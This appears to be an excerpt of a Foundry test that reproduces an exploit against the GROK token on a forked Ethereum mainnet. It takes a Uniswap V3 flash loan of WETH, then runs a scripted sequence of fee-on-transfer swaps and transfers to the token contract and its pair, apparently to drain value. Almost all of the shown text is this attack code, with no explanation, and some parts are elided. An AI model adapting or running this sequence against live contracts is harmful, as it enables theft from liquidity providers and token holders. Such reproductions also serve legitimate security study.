...
contract ContractTest is Test {
    ...
    function setUp() public {
        vm.createSelectFork("mainnet", 18538679 - 1);
    ...
    function testExpolit()public{
        ...
        wethpair.flash(address(this),0,30000000000000000000, new bytes(1));
    ...
    function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {
        if(msg.sender == address(wethpair)){
            ...
            grok.approve(address(router_v2), type(uint).max);
            grok.approve(address(router_v3), type(uint).max);
            //first step
            address[] memory path = new address[](2);
            path[0] = address(grok);
            path[1] = address(weth);
            router_v2.swapExactTokensForTokensSupportingFeeOnTransferTokens(30695631768482954,0,path,address(this),block.timestamp + 100);
            grok.transfer(address(grok),2737958999089419);
            router_v2.swapExactTokensForTokensSupportingFeeOnTransferTokens(30000000000000000,0,path,address(this),block.timestamp + 100);
            path[0] = address(weth);
            path[1] = address(grok);
            router_v2.swapTokensForExactTokens(64067926675248097,weth.balanceOf(address(this)),path, address(this), block.timestamp + 100);
            grok.transfer(address(pair), grok.balanceOf(address(this)));
            //second step
            router_v2.swapExactTokensForTokensSupportingFeeOnTransferTokens(30000000000000000000, 0, path, address(this), block.timestamp + 100);
